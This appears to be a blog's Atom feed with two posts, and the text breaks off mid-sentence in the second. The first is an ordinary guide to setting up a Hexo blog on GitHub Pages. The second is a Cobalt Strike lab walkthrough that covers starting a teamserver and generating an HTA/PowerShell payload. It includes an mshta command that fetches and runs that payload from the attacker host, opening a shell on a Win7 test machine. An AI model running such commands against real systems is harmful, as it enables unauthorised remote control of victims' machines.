<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>故园遗剑</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-03T14:34:28.405Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>mys3t</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>博客搭建过程</title>
    <link href="http://yoursite.com/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/07/03/博客搭建过程/</id>
    <published>2020-07-03T13:09:28.000Z</published>
    <updated>2020-07-03T14:34:28.405Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Win10专业版，64位</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.注册GitHub账号</p><p>2.下载安装Git for windows，一路next即可。</p><p>验证安装：任何位置鼠标右击出现git bash here</p><p>cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p>3.下载安装node.js</p><p>验证安装，cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>4.npm会默认安装</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>在GitHub上创建repository。</p><p>repository的名字必须为yourname.github.io，yourname为GitHub用户名，也就是访问的博客地址。</p><p>注册的邮箱一定要验证，不然不会成功。</p><h2 id="配置SSH-key"><a href="#配置SSH-key" class="headerlink" title="配置SSH key"></a>配置SSH key</h2><p>用于本地与GitHub进行数据交换。</p><h4 id="生成并配置key"><a href="#生成并配置key" class="headerlink" title="生成并配置key"></a>生成并配置key</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;#你的github用户名</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;#填写你的github注册邮箱</span><br></pre></td></tr></table></figure><p>生成ssh密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;. ssh#检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;#生成密钥</span><br></pre></td></tr></table></figure><p>连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容。</p><p>打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： title任意填写，将内容复制到key中即可。</p><h4 id="测试ssh"><a href="#测试ssh" class="headerlink" title="测试ssh"></a>测试ssh</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com #注意邮箱地址不用改</span><br></pre></td></tr></table></figure><p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure><h2 id="使用Hexo"><a href="#使用Hexo" class="headerlink" title="使用Hexo"></a>使用Hexo</h2><p>以下所有命令在git bash下运行</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>验证安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在本地主机上建立一个blog文件夹，用于日后代码，博客的存放，进入此目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>此目录会自动生成hexo相关文件。</p><p>注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。</p><h4 id="安装npm插件"><a href="#安装npm插件" class="headerlink" title="安装npm插件"></a>安装npm插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br></pre></td></tr></table></figure><h4 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h4><p>blog目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g#生成静态页面</span><br><span class="line">hexo s#启动本地预览服务</span><br></pre></td></tr></table></figure><p>执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器访问http:&#x2F;&#x2F;127.0.0.1:4000，即可看到hexo默认生成页面hello,world</span><br></pre></td></tr></table></figure><h2 id="上传GitHub的配置"><a href="#上传GitHub的配置" class="headerlink" title="上传GitHub的配置"></a>上传GitHub的配置</h2><p>配置站点配置文件_config.yml中的deploy部分:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname&#x2F;yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>安装上传插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>上传命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>在hexo根目录下，会将有所改动的内容全部提交至github</p><h2 id="更改Hexo主题及优化"><a href="#更改Hexo主题及优化" class="headerlink" title="更改Hexo主题及优化"></a>更改Hexo主题及优化</h2><h4 id="hexo目录结构"><a href="#hexo目录结构" class="headerlink" title="hexo目录结构"></a>hexo目录结构</h4><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/image-20200703214804373.png" alt="image-20200703214804373"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">deploy：执行hexo deploy命令部署到GitHub上的内容目录;</span><br><span class="line"></span><br><span class="line">public：执行hexo generate命令，输出的静态网页内容目录;</span><br><span class="line"></span><br><span class="line">scaffolds：layout模板文件目录，其中的md文件可以添加编辑;</span><br><span class="line"></span><br><span class="line">scripts：扩展脚本目录，这里可以自定义一些javascript脚本;</span><br><span class="line"></span><br><span class="line">source：文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里;</span><br><span class="line"></span><br><span class="line">drafts：草稿文章;</span><br><span class="line"></span><br><span class="line">posts：发布文章;</span><br><span class="line"></span><br><span class="line">themes：主题文件目录;</span><br><span class="line"></span><br><span class="line">_config.yml：全局配置文件，大多数的设置都在这里;</span><br><span class="line"></span><br><span class="line">package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮;</span><br></pre></td></tr></table></figure><h4 id="next主题目录结构"><a href="#next主题目录结构" class="headerlink" title="next主题目录结构"></a>next主题目录结构</h4><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/image-20200703215229186.png" alt="image-20200703215229186"></p><h4 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h4><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next themes&#x2F;next</span><br></pre></td></tr></table></figure><p>执行完成后会在blog\themes\目录下生成next目录。</p><p>next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，称为主题配置文件。</p><h4 id="主题应用"><a href="#主题应用" class="headerlink" title="主题应用"></a>主题应用</h4><p>配置站点配置文件，寻找theme字段，将其值修改为next（next前后都有一个空格，否则会报错）。</p><h4 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean#清除缓存</span><br><span class="line">hexo g#重新生成代码</span><br><span class="line">hexo s#部署到本地</span><br><span class="line"></span><br><span class="line">浏览器访问http:&#x2F;&#x2F;127.0.0.1:4000查看效果</span><br></pre></td></tr></table></figure><h4 id="主题简单优化"><a href="#主题简单优化" class="headerlink" title="主题简单优化"></a>主题简单优化</h4><h5 id="设置布局："><a href="#设置布局：" class="headerlink" title="设置布局："></a>设置布局：</h5><p>主题配置文件中，寻找Scheme字段，next提供三种默认主题布局，将你想使用的布局取消注释即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#scheme: Muse   </span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><p>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白;</p><p>Mist - Muse 的紧凑版本，整洁有序的单栏外观;</p><p>Pisces - 双栏 Scheme，小家碧玉似的清新.</p><h5 id="设置显示语言"><a href="#设置显示语言" class="headerlink" title="设置显示语言"></a>设置显示语言</h5><p>站点配置文件中，寻找language 字段，设置其值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure><p>语言文件位于hexo\themes\next\languages目录下</p><h5 id="设置侧边栏"><a href="#设置侧边栏" class="headerlink" title="设置侧边栏"></a>设置侧边栏</h5><p>主题配置文件中，设置侧边栏在左侧或右侧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sidebar:</span><br><span class="line">  # Sidebar Position, available value: left | right (only for Pisces | Gemini).</span><br><span class="line">  position: left</span><br><span class="line">  #position: right</span><br></pre></td></tr></table></figure><p>设置侧边栏显示时机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post - 默认行为，在文章页面（拥有目录列表）时显示</span><br><span class="line">always - 在所有页面中都显示</span><br><span class="line">hide - 在所有页面中都隐藏（可以手动展开）</span><br><span class="line">remove - 完全移除</span><br></pre></td></tr></table></figure><h4 id="设置主题菜单"><a href="#设置主题菜单" class="headerlink" title="设置主题菜单"></a>设置主题菜单</h4><p>主题配置文件中，寻找menu字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: &#x2F;#主页</span><br><span class="line">  #archives: &#x2F;archives#归档页</span><br><span class="line">  about: &#x2F;about#关于页</span><br><span class="line">  #categories: &#x2F;categories#分类页</span><br><span class="line">  tags: &#x2F;tags#标签页</span><br><span class="line">  #commonweal: &#x2F;404.html#公益404</span><br></pre></td></tr></table></figure><p>除主页与归档页外，其余页面需要手动创建。每行中||后的内容为指定此menu的图标</p><h5 id="添加标签页"><a href="#添加标签页" class="headerlink" title="添加标签页"></a>添加标签页</h5><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\tags目录中生成index.md文件。</p><p>修改此index.md文件为(添加type行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2016-11-15 19:10:05</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>对于blog\source_post目录下具体博客文章设置tags(设置tags行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h5 id="添加分类页面"><a href="#添加分类页面" class="headerlink" title="添加分类页面"></a>添加分类页面</h5><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>命令执行后，blog\source\categories目录中生成index.md文件。</p><p>修改此index.md文件为(添加categories行)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2016-11-15 19:11:13</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>对于blog\source_post目录下具体博客文章设置categories(设置categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">categories: 搭建博客</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h5 id="添加关于页面"><a href="#添加关于页面" class="headerlink" title="添加关于页面"></a>添加关于页面</h5><p>进入blog根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\about目录中生成index.md文件。</p><p>修改index.md文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: 2016-11-15 19:08:50</span><br><span class="line">---</span><br><span class="line">## 关于我</span><br><span class="line"></span><br><span class="line">一只学习的小菜鸟，欢迎分享知识。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QQ：</span><br><span class="line">Email:</span><br></pre></td></tr></table></figure><h5 id="首页文章只显示一部分"><a href="#首页文章只显示一部分" class="headerlink" title="首页文章只显示一部分"></a>首页文章只显示一部分</h5><p>在博客文章适当位置添加<!--more--> 标记即可</p><h5 id="博客中添加视频"><a href="#博客中添加视频" class="headerlink" title="博客中添加视频"></a>博客中添加视频</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe </span><br><span class="line">height&#x3D;500 width&#x3D;100% </span><br><span class="line">src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx&quot; </span><br><span class="line">frameborder&#x3D;0 allowfullscreen&gt;</span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><h2 id="markdown本地图片问题"><a href="#markdown本地图片问题" class="headerlink" title="markdown本地图片问题"></a>markdown本地图片问题</h2><h4 id="开启-post-asset-folder"><a href="#开启-post-asset-folder" class="headerlink" title="开启 post_asset_folder"></a>开启 post_asset_folder</h4><p>在站点配置文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><h4 id="安装-hexo-asset-image-插件"><a href="#安装-hexo-asset-image-插件" class="headerlink" title="安装 hexo-asset-image 插件"></a>安装 hexo-asset-image 插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https:&#x2F;&#x2F;github.com&#x2F;CodeFalling&#x2F;hexo-asset-image --save</span><br></pre></td></tr></table></figure><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>1、在与 _posts/my_article.md的平级位置上创建文件夹 my_article；<br>2、放置 my_article.md 文件中引用到的图片，例如 my_pic.jpg；<br>3、在 my_article.md 以 <img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/my_pic.jpg" alt="my_pic"> 方式引用。</p><h4 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post 测试文章</span><br></pre></td></tr></table></figure><p>执行命令后会在blog/source/_post目录下生成<code>测试文章</code>.md，已经<code>测试文章</code>文件夹。</p><p>其中<code>测试文章</code>文件夹中存放markdown中使用的图片，具体方法为</p><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/pic.png" alt>  //此处为测试文章文件夹</p><h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot;#新建文章</span><br><span class="line">hexo new page &quot;pageName&quot;#新建页面</span><br><span class="line">hexo generate#生成静态页面至public目录</span><br><span class="line">hexo server#开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）</span><br><span class="line">hexo deploy#部署到GitHub</span><br><span class="line">hexo help#查看帮助</span><br><span class="line">hexo version#查看Hexo的版本</span><br><span class="line">hexo clean#清除缓存</span><br><span class="line"></span><br><span class="line">缩写：</span><br><span class="line">hexo n &#x3D;&#x3D; hexo new</span><br><span class="line">hexo g &#x3D;&#x3D; hexo generate</span><br><span class="line">hexo s &#x3D;&#x3D; hexo server</span><br><span class="line">hexo d &#x3D;&#x3D; hexo deploy</span><br><span class="line"></span><br><span class="line">组合命令：</span><br><span class="line">hexo s -g#生成并本地预览</span><br><span class="line">hexo d -g#生成并上传</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="博客" scheme="http://yoursite.com/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客搭建" scheme="http://yoursite.com/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>Cobaltstrike</title>
    <link href="http://yoursite.com/2020/07/03/Cobaltstrike/"/>
    <id>http://yoursite.com/2020/07/03/Cobaltstrike/</id>
    <published>2020-07-03T08:15:29.000Z</published>
    <updated>2020-07-03T09:37:31.678Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><h2 id="CobaltStrike基础"><a href="#CobaltStrike基础" class="headerlink" title="CobaltStrike基础"></a>CobaltStrike基础</h2><h4 id="关于CobaltStrike"><a href="#关于CobaltStrike" class="headerlink" title="关于CobaltStrike"></a>关于CobaltStrike</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</span><br><span class="line">CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</span><br></pre></td></tr></table></figure><p>Cobaltstrike可自定义的部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cobalt Strike可以使用 AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等。</span><br><span class="line">Cobalt Strike通信配置文件是 Malleable C2，可以修改CS的通讯特征，Beacon payload的一些行为。</span><br><span class="line">Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范&#x2F;框架，它允许黑客根据需要对框架提供的默认HTTP(S)&#x2F;DNS&#x2F;SMB C2 通信通道进行扩展。</span><br></pre></td></tr></table></figure><h4 id="Cobaltstrike目录"><a href="#Cobaltstrike目录" class="headerlink" title="Cobaltstrike目录"></a>Cobaltstrike目录</h4><p>目录：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200623222055788.png" alt="image-20200623222055788.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">agscript 拓展应用的脚本</span><br><span class="line">c2lint 用于检查profile的错误异常</span><br><span class="line">teamserver 服务端程序</span><br><span class="line">cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</span><br><span class="line">logs 目录记录与目标主机的相关信息</span><br><span class="line">update，update.jar用于更新CS</span><br><span class="line">third-party 第三方工具</span><br><span class="line">start.sh 客户端启动脚本</span><br></pre></td></tr></table></figure><p> 最核心的就是teamserver和cobaltstrike.jar，分别是服务端和客户端。</p><h4 id="使用Cobaltstrike"><a href="#使用Cobaltstrike" class="headerlink" title="使用Cobaltstrike"></a>使用Cobaltstrike</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.首先给teamserver权限：</span><br><span class="line">chmod 777 teamserver</span><br><span class="line">2.启动，第一个参数是地址，第二个参数是密码，地址是服务端的地址，密码任意设置。</span><br><span class="line"> .&#x2F;teamserver xx.xxx.xx.x password</span><br><span class="line">3.打开客户端</span><br><span class="line"> .&#x2F;start.sh</span><br></pre></td></tr></table></figure><p>启动后界面如图：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200623215837657.png" alt="image-20200623215837657.png"></p><p>此处的端口默认为50050，如果更改了teamserver文件里的server_port值那么在此处就需要改成对应的。</p><p>连接进去后：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200623222213228.png" alt></p><p><strong>先简单走一遍木马上线</strong></p><p>首先创建一个listener，左上角cobaltstrike–&gt;listeners</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202233213.png" alt="image-20200624202233213"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202329852.png" alt="image-20200624202329852"></p><p>payload主要分为beacon和foreign两大类。Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、SMB。</p><p>Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202551269.png" alt="image-20200624202551269"></p><p>下面选择攻击途径，选中html application，采用html应用的途径攻击。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202658222.png" alt></p><p>选择方法，分别是可执行文件，powershell，vb程序，这里选择powershell</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202751335.png" alt="image-20200624202751335"></p><p>点击generate生成，选择存放路径</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624202903898.png" alt="image-20200624202903898"></p><p>然后利用web服务，打开通道</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203106791.png" alt="image-20200624203106791"></p><p>在file一行选中前面生成的hta文件的路径。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203225279.png" alt="image-20200624203225279"></p><p>点击launch即可生成链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.12.135:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure><p> 这条链接就是用于执行本次攻击.</p><p>打开win7靶机，打开cmd，执行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;172.16.12.135:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure><p>此时回到kali中，可以看到靶机已经上线</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203653055.png" alt="image-20200624203653055"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203741794.png" alt="image-20200624203741794"></p><p>在eventlog中可以看到相关日志</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624203825761.png" alt="image-20200624203825761"></p><p>选中这条记录，右键点击interact，即可与靶机进行交互</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204002558.png" alt="image-20200624204002558"></p><p>进行shell交互，只需要输入shell “命令”即可</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204452497.png" alt></p><h4 id="各个模块简介"><a href="#各个模块简介" class="headerlink" title="各个模块简介"></a>各个模块简介</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624204709917.png" alt="image-20200624204709917"></p><p>new connection 新建立一个用户连接，即连接到一个新的teamserver上。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204828986.png" alt></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624204845245.png" alt></p><p>  Preferences 配置自己的设置。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205135146.png" alt></p><p>Visualization可视化。</p><p> pivot graph：控制主机视图 </p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205312828.png" alt></p><p> session table ：会话视图</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205350008.png" alt="image-20200624205350008"></p><p> Target 